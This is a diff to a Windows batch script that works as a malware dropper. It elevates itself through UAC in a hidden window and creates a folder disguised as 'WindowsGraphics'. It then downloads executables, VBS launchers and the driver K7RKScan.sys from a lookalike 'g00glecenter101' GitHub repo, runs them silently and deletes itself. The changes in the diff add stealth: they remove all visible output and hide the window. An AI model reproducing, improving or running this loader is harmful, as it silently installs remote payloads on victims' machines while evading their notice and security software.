@@ -2,65 +2,48 @@
 setlocal
 
 :: ============================================================
-:: 1. UAC ELEVATION (The "One-Time" Admin Ask)
+:: 1. UAC ELEVATION & AUTO-HIDE
 :: ============================================================
-:: This ensures everything (Sigurd, Whitelisting, Drivers) works silently.
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [SYSTEM] Requesting administrative privileges...
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\admin.vbs"
+    :: The '0' at the end of the next line tells Windows to run the window HIDDEN
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
     wscript "%temp%\admin.vbs"
     exit /b
 )
 if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"
 
 :: ============================================================
-:: 2. DIRECTORY SETUP
+:: 2. DIRECTORY SETUP (Now running hidden)
 :: ============================================================
 set "workDir=%AppData%\Local\WindowsGraphics\"
-if not exist "%workDir%" mkdir "%workDir%"
+if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
 cd /d "%workDir%"
+if not exist "driver" mkdir "driver" >nul 2>&1
 
-:: Create the driver folder specifically for k7RKScan
-if not exist "driver" mkdir "driver"
-
-echo [SYSTEM] Syncing components...
+:: Security Protocol Fix
+set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"
 
 :: ============================================================
-:: 3. DOWNLOADS (Paste your RAW GitHub links below)
+:: 3. DOWNLOADS
 :: ============================================================
+:: All 'echo' commands removed so no text is generated
 
-:: 1. launcher.vbs
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
-
-:: 2. boom.bat
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
-
-:: 3. sigurd.exe
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
-
-:: 5. config.toml (or config.toml)
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'config.toml')"
-
-:: FILE 6: The Ghost Launcher (Saved as launcher.vbs)
-echo [SYSTEM] Finalizing Ghost module...
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
-
-:: 7. THE DRIVER (k7RKScan.sys) - Put inside the driver folder
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'Config.toml')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
+powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"
 
 :: ============================================================
 :: 4. THE SILENT HANDOFF
 :: ============================================================
-echo [FINISHING] Initializing system...
-
-:: Launch the VBS silently. Because this script is Admin, VBS will be too.
 if exist "launcher.vbs" (
     start "" "wscript.exe" "launcher.vbs"
 )
 
-:: Clean up the installer so it disappears
-echo [SUCCESS] Configuration complete.
+:: Self-delete
 (goto) 2>nul & del "%~f0"
 exit
